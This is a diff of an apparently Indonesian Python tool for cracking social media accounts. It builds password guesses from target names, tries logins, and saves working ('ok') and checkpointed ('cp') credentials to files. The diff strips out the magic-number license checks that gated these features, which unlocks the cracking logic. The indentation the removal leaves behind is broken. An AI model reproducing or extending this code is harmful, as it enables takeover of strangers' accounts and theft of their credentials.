@@ -256,9 +256,6 @@ def mkdir_data_login():
     # Make Directory Result
     try:os.mkdir("OK")
     except:pass
-    # Make Directory License
-    try:os.mkdir("license")
-    except:pass
     # Delete Cookies
     try:os.remove('login/cookie.json')
     except:pass
@@ -1213,10 +1210,8 @@ def urut_crack():
 def password(user):
     global pass_manual1, pass_manual2
     listpass = []
-    if SAKERA != 159403:
         for x in range(0,10000000000000):listpass.append(str(x))
         return listpass
-    else:
         try:
             ps, pp, na = pass_manual1, pass_manual2, user.split(" ")
             if len(na) < 2:
@@ -1441,8 +1436,6 @@ class crack:
                 elif sistem_login == 'tiga' : log = logger3(id,pw)
                 else:log = logger1(id,pw)
                 if log['status'] == 'cp':
-                    if sakura != 159384:pass
-                    else:
                         files_cp = "CP/%s.json"%(tanggal)
                         try:
                             with requests.Session() as xyz:
@@ -1461,8 +1454,6 @@ class crack:
                         open(files_cp,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                         break
                 elif log['status'] == 'ok':
-                    if sakera != 159369:pass
-                    else:
                         files_ok = "OK/%s.json"%(tanggal)
                         try:
                             with requests.Session() as xyz:
@@ -1480,8 +1471,6 @@ class crack:
                         self.ok.append("%s=%s"%(id,pw))
                         open(files_ok,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                         break
-                else:
-                    if sakara != 159375:print(CoY)
                     else:continue
             self.lp += 1
             loop = str(self.lp)
